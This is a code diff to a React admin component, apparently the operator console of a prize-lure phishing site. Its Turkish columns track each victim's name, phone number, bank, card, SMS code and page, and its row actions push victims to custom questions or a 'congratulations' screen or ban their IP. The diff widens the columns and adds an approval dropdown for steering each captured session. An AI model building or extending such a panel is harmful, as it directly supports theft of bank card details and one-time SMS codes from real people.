@@ -1876,20 +1876,20 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       {/* TABLE */}
       <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
         <div className="overflow-x-auto pb-4">
-          <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
+          <table className="w-full table-auto border-collapse text-[10px] text-left lg:text-[11px]">
             <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
-                <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">ID</th>
-                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
-                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
-                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
-                <th className="w-[32%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
-                <th className="w-[14%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
-                <th className="w-[11%] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
-                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
-                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
-                <th className="w-[12%] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
+                <th className="min-w-[55px] px-2 py-3 font-semibold whitespace-nowrap">ID</th>
+                <th className="min-w-[55px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
+                <th className="min-w-[85px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
+                <th className="min-w-[190px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
+                <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
+                <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
+                <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
+                <th className="min-w-[150px] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
               </tr>
             </thead>
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
@@ -2545,6 +2545,24 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           <option value="custom_question">❓ Özel Soru Sor</option>
                           <option value="congrats">✅ Tebrikler Ekranına Al</option>
                           <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
+                        </select>
+
+                        <select
+                          className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-emerald-500/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                          value=""
+                          onChange={(e) => {
+                            if (e.target.value) {
+                              void handleApprovalAction(row.id, e.target.value);
+                              e.target.value = "";
+                            }
+                          }}
+                        >
+                          <option value="">Onay Seçin...</option>
+                          {APPROVAL_OPTIONS.map((option) => (
+                            <option key={option.value} value={option.value}>
+                              {option.label}
+                            </option>
+                          ))}
                         </select>
 
                         <div className="flex justify-end items-center mt-0.5 gap-1 w-full">
